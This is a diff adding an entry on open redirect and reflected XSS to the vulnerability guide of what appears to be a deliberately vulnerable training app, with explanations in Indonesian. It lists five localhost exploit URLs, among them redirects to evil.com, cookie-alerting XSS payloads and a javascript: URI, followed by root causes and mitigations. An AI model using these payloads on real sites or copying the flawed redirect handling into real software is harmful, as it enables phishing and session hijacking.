@@ -443,6 +443,59 @@ wait
 
 ---
 
+### 19. Open Redirect + Reflected XSS — `OWASP A01:2021` / `OWASP A03:2021`
+
+| Property | Value |
+|----------|-------|
+| **Endpoint (Frontend)** | `/login?redirect=<url>` |
+| **Endpoint (Backend)** | `GET /api/redirect?url=<url>` |
+| **Root Cause** | No URL validation/whitelist; URL reflected in HTML without sanitisation |
+| **Impact** | Phishing, credential theft, session hijacking via XSS |
+
+**Exploit 1 — Open Redirect (Login):**
+```
+http://localhost/login?redirect=https://evil.com
+→ Setelah login berhasil, user di-redirect ke evil.com
+```
+
+**Exploit 2 — Reflected XSS via redirect param (Login page):**
+```
+http://localhost/login?redirect=<img src=x onerror=alert(document.cookie)>
+→ Payload dirender di halaman login via dangerouslySetInnerHTML
+```
+
+**Exploit 3 — XSS via javascript: URI (post-login):**
+```
+http://localhost/login?redirect=javascript:alert(document.cookie)
+→ Setelah login, window.location.href = "javascript:..." → JS dieksekusi
+```
+
+**Exploit 4 — Backend Open Redirect:**
+```bash
+curl -v "http://localhost:3001/api/redirect?url=https://evil.com"
+→ 302 redirect ke URL apapun
+```
+
+**Exploit 5 — Backend Reflected XSS (browser):**
+```
+http://localhost:3001/api/redirect?url="><script>alert(1)</script>
+→ URL direfleksikan dalam HTML response tanpa escaping
+```
+
+**Apa yang salah:**
+- Parameter `redirect` / `url` diterima tanpa validasi — bisa URL eksternal atau `javascript:`
+- Frontend menggunakan `dangerouslySetInnerHTML` untuk menampilkan URL redirect
+- Backend menggunakan string interpolation ke HTML tanpa encoding
+- `window.location.href` menerima `javascript:` URI
+
+**Cara mitigasi:**
+- Whitelist hanya relative paths: validasi bahwa URL dimulai dengan `/` dan bukan `//`
+- Jangan gunakan `dangerouslySetInnerHTML` — gunakan React text rendering biasa
+- HTML-encode semua output di backend HTML responses
+- Validasi URL scheme (hanya izinkan `http:` dan `https:`)
+
+---
+
 ## Additional Weaknesses
 
 | Weakness | Location | Description |
